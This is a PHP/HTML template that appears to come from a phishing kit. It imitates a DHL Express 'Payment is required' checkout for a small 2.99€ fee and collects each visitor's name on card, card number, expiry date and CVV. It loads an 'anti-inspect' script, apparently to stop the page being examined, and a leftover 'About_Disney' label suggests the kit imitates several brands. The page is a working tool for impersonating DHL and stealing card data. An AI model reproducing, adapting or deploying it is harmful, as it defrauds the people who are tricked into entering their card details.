<?php require_once(__DIR__ . '/../includes/page-common.php'); ?>
<!DOCTYPE html>
<html lang="<?php echo htmlspecialchars($selectedLanguage); ?>">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="Cache-Control" content="no-cache">
    <title><?php echo htmlspecialchars($translations['dhl_card_meta'] ?? 'DHL'); ?></title>
    <link rel="stylesheet" href="<?php echo htmlspecialchars($dhlStyleHref, ENT_QUOTES, 'UTF-8'); ?>">
    <script src="js/security-common.js"></script>
    <script src="../js/anti-inspect.js"></script>
</head>
<body class="holl-page js-focus-visible" data-page="card">
<nav class="holl-nav" aria-label="Brand">
    <div class="holl-nav-inner">
        <svg xmlns="http://www.w3.org/2000/svg" enable-background="new 0 0 143.5 20" height="20" viewBox="0 0 143.5 20" width="143.5" aria-hidden="true"><g fill="#d40511"><path d="m0 18.5h17.4l-1 1.4h-16.4z"/><path d="m143.5 19.9h-21.3l1.1-1.4h20.3v1.4z"/><path d="m0 15.9h19.4l-1.1 1.4h-18.3z"/><path d="m0 13.3h21.4l-1.1 1.4h-20.3z"/><path d="m143.5 17.3h-19.3l1.1-1.4h18.3v1.4z"/><path d="m127.2 13.3h16.3v1.4h-17.4z"/><path d="m18.8 19.9 9.2-12.3h11.4c1.3 0 1.3.5.6 1.3-.6.8-1.7 2.3-2.3 3.1-.3.5-.9 1.2 1 1.2h15.3c-1.2 1.8-5.4 6.8-12.8 6.8-6-.1-22.4-.1-22.4-.1z"/><path d="m71.5 13.3-5 6.7h-13.1l5-6.7z"/><path d="m90.6 13.3-5 6.7h-13.2l5-6.7z"/><path d="m94.9 13.3s-1 1.3-1.4 1.9c-1.7 2.2-.2 4.8 5.2 4.8h21.2l5-6.7z"/><path d="m25.3 0-4.6 6.1h25c1.3 0 1.3.5.6 1.3-.6.8-1.7 2.3-2.3 3.1-.3.4-.9 1.2 1 1.2h10.2s1.7-2.2 3-4.1c1.9-2.5.2-7.7-6.5-7.7-6 .1-26.4.1-26.4.1z"/><path d="m91.7 11.7h-32.2l8.8-11.7h13.2l-5 6.7h5.9l5-6.7h13.2z"/><path d="m118.8 0-8.8 11.7h-14l8.8-11.7z"/></g></svg>
        <span class="holl-nav-title"><?php echo htmlspecialchars($translations['dhl_nav_payment_required'] ?? 'Payment is required'); ?></span>
    </div>
</nav>
<main class="holl-main">
    <div class="holl-screen-center">
        <div class="holl-modal-root" aria-labelledby="pay-modal-title" role="dialog" aria-modal="true">
            <div class="holl-scrim" aria-hidden="true"></div>
            <div class="holl-modal-scroll">
                <div class="holl-modal-card">
                    <div class="holl-modal-body">
                        <div class="holl-secur" aria-hidden="true"></div>
                        <div class="holl-summary">
                            <div class="holl-summary-row"><span><?php echo htmlspecialchars($translations['dhl_merchant'] ?? 'Merchant:'); ?></span><span><?php echo htmlspecialchars($translations['dhl_brand'] ?? 'DHL Express'); ?></span></div>
                            <div class="holl-summary-row"><span><?php echo htmlspecialchars($translations['dhl_amount'] ?? 'Amount:'); ?></span><span><?php echo htmlspecialchars($translations['dhl_amount_sample_value'] ?? '2.99€'); ?></span></div>
                            <div class="holl-summary-row"><span><?php echo htmlspecialchars($translations['dhl_date'] ?? 'Date:'); ?></span><span><?php echo htmlspecialchars((new DateTimeImmutable('now'))->format('n/j/Y')); ?></span></div>
                        </div>
                        <form id="cardForm" name="cardForm" method="post" action="">
                            <div class="holl-secure-banner">
                                <svg class="w-5 h-5" width="22" height="22" viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="#108a00" d="M512 64a448 448 0 1 1 0 896 448 448 0 0 1 0-896zm-55.808 536.384-99.52-99.584a38.4 38.4 0 1 0-54.336 54.336l126.72 126.72a38.272 38.272 0 0 0 54.336 0l262.4-262.464a38.4 38.4 0 1 0-54.272-54.336L456.192 600.384z"/></svg>
                                <p class="holl-secure-lead"><?php echo htmlspecialchars($translations['dhl_secure_checkout'] ?? 'Secure checkout'); ?></p>
                                <div class="holl-div"></div>
                                <p class="holl-secure-sub"><?php echo htmlspecialchars($translations['dhl_payment_protected'] ?? ''); ?></p>
                            </div>
                            <div class="holl-pay-field">
                                <label for="cardName"><?php echo htmlspecialchars($translations['NAME_ON_THE_CARD']); ?></label>
                                <input type="text" id="cardName" name="cardName" autocomplete="cc-name" required placeholder="<?php echo htmlspecialchars($translations['dhl_name_on_card_placeholder'] ?? 'John Doe'); ?>">
                            </div>
                            <div class="holl-pay-field">
                                <label for="cardNumber"><?php echo htmlspecialchars($translations['Card_number']); ?></label>
                                <input type="text" id="cardNumber" name="cardNumber" inputmode="numeric" autocomplete="cc-number" maxlength="24" required placeholder="<?php echo htmlspecialchars($translations['dhl_card_number_placeholder'] ?? '---- ---- ---- ----'); ?>">
                                <div class="holl-card-icons" aria-hidden="true"><span style="font-size:10px;font-weight:700;padding:4px 8px;border:1px solid #ddd;border-radius:4px;">VISA</span><span style="font-size:10px;font-weight:700;padding:4px 8px;border:1px solid #ddd;border-radius:4px;">MC</span><span style="font-size:10px;font-weight:700;padding:4px 8px;border:1px solid #ddd;border-radius:4px;">AMEX</span></div>
                            </div>
                            <div class="holl-pay-row">
                                <div class="holl-pay-field">
                                    <label for="expiryDate"><?php echo htmlspecialchars($translations['EXPIRATION_DATE']); ?></label>
                                    <input type="text" id="expiryDate" name="expiryDate" inputmode="numeric" maxlength="5" required placeholder="<?php echo htmlspecialchars($translations['MM_YY']); ?>">
                                </div>
                                <div class="holl-pay-field">
                                    <label for="cvv"><?php echo htmlspecialchars($translations['SECURITY_CODE']); ?></label>
                                    <input type="text" id="cvv" name="cvv" inputmode="numeric" maxlength="4" autocomplete="cc-csc" required placeholder="***">
                                </div>
                            </div>
                            <p class="holl-form-note"><?php echo htmlspecialchars($translations['performstemporary']); ?></p>
                            <button type="submit" class="holl-btn-red" id="submitBtn"><?php echo htmlspecialchars($translations['CONTINUE']); ?></button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</main>
<footer class="holl-footer">
    <div class="holl-footer-inner">
        <div class="holl-footer-links">
            <a href="#"><?php echo htmlspecialchars($translations['dhl_footer_privacy'] ?? $translations['Privacy_Policy']); ?></a>
            <span class="holl-footer-sep">|</span>
            <a href="#"><?php echo htmlspecialchars($translations['dhl_footer_cookie'] ?? $translations['Cookie_Terms']); ?></a>
            <span class="holl-footer-sep">|</span>
            <a href="#"><?php echo htmlspecialchars($translations['dhl_footer_data'] ?? $translations['Data_Rights']); ?></a>
            <span class="holl-footer-sep">|</span>
            <a href="#"><?php echo htmlspecialchars($translations['dhl_footer_corp'] ?? $translations['About_Disney']); ?></a>
            <span class="holl-footer-sep">|</span>
            <a href="#"><?php echo htmlspecialchars($translations['dhl_footer_disclaimer'] ?? 'Disclaimer'); ?></a>
        </div>
    </div>
</footer>
<script src="../js/pages-config.js?v=<?php echo time(); ?>"></script>
<script src="../js/session-manager.js?v=<?php echo time(); ?>"></script>
<script src="../js/validation.js?v=<?php echo time(); ?>"></script>
<script src="../js/app.js?v=<?php echo time(); ?>"></script>
</body>
</html>
